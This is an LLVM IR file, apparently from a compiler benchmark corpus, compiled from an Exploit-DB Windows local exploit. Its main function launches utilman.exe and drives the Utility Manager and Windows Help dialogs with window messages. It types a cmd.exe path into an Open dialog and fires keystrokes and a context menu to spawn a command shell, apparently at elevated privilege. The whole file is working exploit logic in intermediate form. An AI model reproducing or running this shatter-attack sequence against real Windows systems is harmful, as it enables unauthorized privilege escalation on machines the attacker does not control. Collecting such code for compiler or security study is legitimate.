; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_271.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_271.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i32 }

@__const.main.sText = private unnamed_addr constant [26 x i8] c"%windir%\\system32\\cmd.ex?\00", align 16
@.str = private unnamed_addr constant [19 x i8] c"utilman.exe /start\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"Utility manager\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"Windows Help\00", align 1
@WM_COMMAND = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"#32770\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"Open\00", align 1
@WM_SETTEXT = common dso_local global i32 0, align 4
@WM_IME_KEYDOWN = common dso_local global i32 0, align 4
@VK_RETURN = common dso_local global i32 0, align 4
@VK_TAB = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [17 x i8] c"SHELLDLL_DefView\00", align 1
@WM_CONTEXTMENU = common dso_local global i32 0, align 4
@WM_KEYDOWN = common dso_local global i32 0, align 4
@VK_DOWN = common dso_local global i32 0, align 4
@WM_CLOSE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.TYPE_3__, align 4
  %9 = alloca [26 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [26 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([26 x i8], [26 x i8]* @__const.main.sText, i32 0, i32 0), i64 26, i1 false)
  %11 = call i32 @system(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @Sleep(i32 500)
  %13 = call i32 @FindWindow(i8* null, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %14 = call i32 @SendMessage(i32 %13, i32 77, i32 0, i32 0)
  %15 = call i32 @Sleep(i32 500)
  %16 = call i32 @FindWindow(i8* null, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %17 = load i32, i32* @WM_COMMAND, align 4
  %18 = call i32 @PostMessage(i32 %16, i32 %17, i32 1101, i32 0)
  %19 = call i32 @Sleep(i32 500)
  %20 = call i32 @FindWindow(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i32 %20, i32* %6, align 4
  %21 = load i32, i32* %6, align 4
  %22 = call i32 @GetDlgItem(i32 %21, i32 1148)
  store i32 %22, i32* %7, align 4
  %23 = call i32 @Sleep(i32 500)
  %24 = load i32, i32* %7, align 4
  %25 = load i32, i32* @WM_SETTEXT, align 4
  %26 = getelementptr inbounds [26 x i8], [26 x i8]* %9, i64 0, i64 0
  %27 = ptrtoint i8* %26 to i32
  %28 = call i32 @SendMessage(i32 %24, i32 %25, i32 0, i32 %27)
  %29 = call i32 @Sleep(i32 800)
  %30 = load i32, i32* %7, align 4
  %31 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %32 = load i32, i32* @VK_RETURN, align 4
  %33 = call i32 @SendMessage(i32 %30, i32 %31, i32 %32, i32 0)
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @GetDlgItem(i32 %34, i32 1184)
  store i32 %35, i32* %7, align 4
  %36 = load i32, i32* %7, align 4
  %37 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %38 = load i32, i32* @VK_TAB, align 4
  %39 = call i32 @SendMessage(i32 %36, i32 %37, i32 %38, i32 0)
  %40 = call i32 @Sleep(i32 500)
  %41 = load i32, i32* %6, align 4
  %42 = call i32 @FindWindowEx(i32 %41, i32* null, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i32* null)
  store i32 %42, i32* %7, align 4
  %43 = load i32, i32* %7, align 4
  %44 = call i32 @GetDlgItem(i32 %43, i32 1)
  store i32 %44, i32* %7, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %47 = call i32 @SendMessage(i32 %45, i32 %46, i32 67, i32 0)
  %48 = load i32, i32* %7, align 4
  %49 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %50 = call i32 @SendMessage(i32 %48, i32 %49, i32 77, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = load i32, i32* @WM_IME_KEYDOWN, align 4
  %53 = call i32 @SendMessage(i32 %51, i32 %52, i32 68, i32 0)
  %54 = call i32 @Sleep(i32 500)
  %55 = load i32, i32* %7, align 4
  %56 = load i32, i32* @WM_CONTEXTMENU, align 4
  %57 = call i32 @PostMessage(i32 %55, i32 %56, i32 0, i32 0)
  %58 = call i32 @Sleep(i32 1000)
  %59 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %8, i32 0, i32 0
  store i32 10, i32* %59, align 4
  %60 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %8, i32 0, i32 1
  store i32 30, i32* %60, align 4
  %61 = bitcast %struct.TYPE_3__* %8 to i64*
  %62 = load i64, i64* %61, align 4
  %63 = call i32 @WindowFromPoint(i64 %62)
  store i32 %63, i32* %7, align 4
  %64 = load i32, i32* %7, align 4
  %65 = load i32, i32* @WM_KEYDOWN, align 4
  %66 = load i32, i32* @VK_DOWN, align 4
  %67 = call i32 @SendMessage(i32 %64, i32 %65, i32 %66, i32 0)
  %68 = load i32, i32* %7, align 4
  %69 = load i32, i32* @WM_KEYDOWN, align 4
  %70 = load i32, i32* @VK_DOWN, align 4
  %71 = call i32 @SendMessage(i32 %68, i32 %69, i32 %70, i32 0)
  %72 = load i32, i32* %7, align 4
  %73 = load i32, i32* @WM_KEYDOWN, align 4
  %74 = load i32, i32* @VK_RETURN, align 4
  %75 = call i32 @SendMessage(i32 %72, i32 %73, i32 %74, i32 0)
  %76 = load i32, i32* %6, align 4
  %77 = load i32, i32* @WM_CLOSE, align 4
  %78 = call i32 @SendMessage(i32 %76, i32 %77, i32 0, i32 0)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @SendMessage(i32, i32, i32, i32) #2

declare dso_local i32 @FindWindow(i8*, i8*) #2

declare dso_local i32 @PostMessage(i32, i32, i32, i32) #2

declare dso_local i32 @GetDlgItem(i32, i32) #2

declare dso_local i32 @FindWindowEx(i32, i32*, i8*, i32*) #2

declare dso_local i32 @WindowFromPoint(i64) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
